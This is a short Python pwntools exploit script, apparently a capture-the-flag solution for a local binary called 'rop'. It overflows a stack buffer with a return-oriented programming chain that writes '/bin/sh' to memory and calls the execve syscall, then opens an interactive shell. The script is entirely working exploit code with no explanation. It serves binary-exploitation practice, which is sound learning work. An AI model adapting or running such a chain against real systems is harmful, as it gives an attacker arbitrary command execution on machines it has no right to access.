from pwn import *

#r = process('../rop/share/rop')
r = remote('127.0.0.1', 10005)

pop_rdi = 0x401ff0
mov_rsi_rax = 0x418551
pop_rsi = 0x408e5c
pop_rax = 0x41732c
pop_rdx_pop_rbx = 0x45d9c7
syscall = 0x4011ef

rop = b''
rop += p64(pop_rsi)
rop += p64(0x49d0c0)
rop += p64(pop_rax)
rop += b'/bin/sh\x00'
rop += p64(mov_rsi_rax)

rop += p64(pop_rax)
rop += p64(0x3b)

rop += p64(pop_rdi)
rop += p64(0x49d0c0)

rop += p64(pop_rsi)
rop += p64(0)

rop += p64(pop_rdx_pop_rbx)
rop += p64(0)
rop += p64(0)

rop += p64(syscall)
payload = b'A' * (0x20 + 8) + rop + p64(0xdeadbeef)

r.sendlineafter(b'Give me your message: ', payload)
r.interactive()
